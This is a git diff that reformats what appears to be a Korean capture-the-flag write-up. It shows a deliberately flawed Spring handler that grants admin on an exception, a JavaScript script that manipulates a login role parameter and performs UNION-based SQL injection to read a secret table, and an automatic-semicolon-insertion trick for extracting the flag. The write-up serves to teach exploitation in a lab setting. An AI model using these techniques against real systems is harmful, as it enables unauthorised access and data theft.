@@ -51,7 +51,7 @@ class ShieldCloud : AuthenticationSuccessHandler {
             } catch (e: JsonParseException) {
                 authorities.add(SimpleGrantedAuthority("ROLE_USER"))
             } catch (e: Exception) { // [!code highlight:3]
-                authorities.add(SimpleGrantedAuthority("ROLE_ADMIN")) 
+                authorities.add(SimpleGrantedAuthority("ROLE_ADMIN"))
             }
         } else {
             authorities.add(SimpleGrantedAuthority("ROLE_USER"))
@@ -254,50 +254,50 @@ import axios from 'axios';
 import { stringify, parse } from 'qs';
 
 const instance = axios.create({
-	baseURL: 'http://13.125.48.233:8780'
+  baseURL: 'http://13.125.48.233:8780',
 });
 
 const csrfTokenRes = await instance.get('/user/login');
 const csrfToken = csrfTokenRes.data.match(/value="(.+)"/)[1];
 let TOKEN = csrfTokenRes.headers['set-cookie']?.[0].split(';')[0];
 const loginRes = await instance.post(
-	'/user/login?ShieldParam=%7B%22userasdf_role%22%3Anull%7D',
-	stringify({
-		username: 'asdfasdfasdf12',
-		password: 'asdfasdfasdf12',
-		_csrf: csrfToken
-	}),
-	{
-		maxRedirects: 0,
-		headers: {
-			cookie: TOKEN,
-			'Content-Type': 'application/x-www-form-urlencoded'
-		},
-		validateStatus: (status) => status === 302
-	}
+  '/user/login?ShieldParam=%7B%22userasdf_role%22%3Anull%7D',
+  stringify({
+    username: 'asdfasdfasdf12',
+    password: 'asdfasdfasdf12',
+    _csrf: csrfToken,
+  }),
+  {
+    maxRedirects: 0,
+    headers: {
+      cookie: TOKEN,
+      'Content-Type': 'application/x-www-form-urlencoded',
+    },
+    validateStatus: (status) => status === 302,
+  },
 );
 
 TOKEN = loginRes.headers['set-cookie']?.[0].split(';')[0];
 
 await instance.get('/api/v6/shieldosint/query', {
-	params: { q: 'Y' },
-	headers: { cookie: TOKEN }
+  params: { q: 'Y' },
+  headers: { cookie: TOKEN },
 });
 
 const sql = `UNION(SELECT(sdata)FROM(SITE_SECRET))`;
 console.info(sql.length);
 await instance
-	.get('/api/v6/shieldosint/search', {
-		params: { s: 'filterQuery', q: `a a ${sql}`, mp: 'string' },
-		headers: { cookie: TOKEN }
-	})
-	.then((v) => console.log(v.data.replace('Query Result: ', '').length));
+  .get('/api/v6/shieldosint/search', {
+    params: { s: 'filterQuery', q: `a a ${sql}`, mp: 'string' },
+    headers: { cookie: TOKEN },
+  })
+  .then((v) => console.log(v.data.replace('Query Result: ', '').length));
 await instance
-	.get('/api/v6/shieldosint/search', {
-		params: { s: 'selectQuery', q: `a a ${sql}`, mp: 'string' },
-		headers: { cookie: TOKEN }
-	})
-	.then((v) => console.log(v.data.replace('Query Result: ', '')));
+  .get('/api/v6/shieldosint/search', {
+    params: { s: 'selectQuery', q: `a a ${sql}`, mp: 'string' },
+    headers: { cookie: TOKEN },
+  })
+  .then((v) => console.log(v.data.replace('Query Result: ', '')));
 ```
 
 ~~플래그를 안 적어뒀다 ㅠㅠ~~
@@ -355,7 +355,7 @@ def verify_file():
                     if exif_data:
                         exif = {ExifTags.TAGS.get(tag, tag): value for tag, value in exif_data.items()}
                         for key, value in exif.items():
-                            if "ImageDescription" in key: 
+                            if "ImageDescription" in key:
                                 ret = validate_domain(value) or validate_ipv4(value) or validate_ipv6(value)
                                 if not ret:
                                     return jsonify({'success': 'Verified'})
@@ -490,42 +490,44 @@ module.exports = {
 const http = require('http');
 
 const isMultiRequest = (path, options) => {
-	const delimiter = options.multiRequest;
-	return delimiter ? path.split('/').find((fragment) => fragment.includes(delimiter)) : false;
+  const delimiter = options.multiRequest;
+  return delimiter
+    ? path.split('/').find((fragment) => fragment.includes(delimiter))
+    : false;
 };
 
 const doMultiRequest = (req, path) => {
-	const options = req.app.get('dyson_options');
-	const { err } = req.app.get('dyson_logger');
-	const [hostname, port] = req.headers.host.split(':');
-	const delimiter = options.multiRequest;
-	const range = isMultiRequest(path, options);
+  const options = req.app.get('dyson_options');
+  const { err } = req.app.get('dyson_logger');
+  const [hostname, port] = req.headers.host.split(':');
+  const delimiter = options.multiRequest;
+  const range = isMultiRequest(path, options);
 
-	return range.split(delimiter).map((id, index, list) => {
-		const url = path.replace(list, id);
-		let data = '';
+  return range.split(delimiter).map((id, index, list) => {
+    const url = path.replace(list, id);
+    let data = '';
 
-		return new Promise((resolve, reject) => {
-			http
-				.get({ hostname, port, path: url }, (res) => {
-					res.on('data', (chunk) => {
-						data += chunk;
-					});
-					res.on('end', () => {
-						resolve(JSON.parse(data));
-					});
-				})
-				.on('error', (error) => {
-					err(error.message);
-					reject(error);
-				});
-		});
-	});
+    return new Promise((resolve, reject) => {
+      http
+        .get({ hostname, port, path: url }, (res) => {
+          res.on('data', (chunk) => {
+            data += chunk;
+          });
+          res.on('end', () => {
+            resolve(JSON.parse(data));
+          });
+        })
+        .on('error', (error) => {
+          err(error.message);
+          reject(error);
+        });
+    });
+  });
 };
 
 module.exports = {
-	isMultiRequest,
-	doMultiRequest
+  isMultiRequest,
+  doMultiRequest,
 };
 ```
 
@@ -545,9 +547,9 @@ const SuperSecretPassword = '[REDACTED]'
 
 ```javascript
 const SuperSecretPassword =
-	/*"[REDACTED]" [guessPassword, guessFlag] =*/ req.query.guess !== undefined
-		? atob(req.query.guess).split('|')
-		: ['idk', 'idk'];
+  /*"[REDACTED]" [guessPassword, guessFlag] =*/ req.query.guess !== undefined
+    ? atob(req.query.guess).split('|')
+    : ['idk', 'idk'];
 ```
 
 는 `ASI misbehavior`로 인해, 같은 코드로 인식된다. 따라서, `http://url:port/user?,api/flagService?guess=`으로 요청을 하면 `flag`를 얻을 수 있다. (물론 아래 사진과 같이, `host`를 변경해야 한다.)
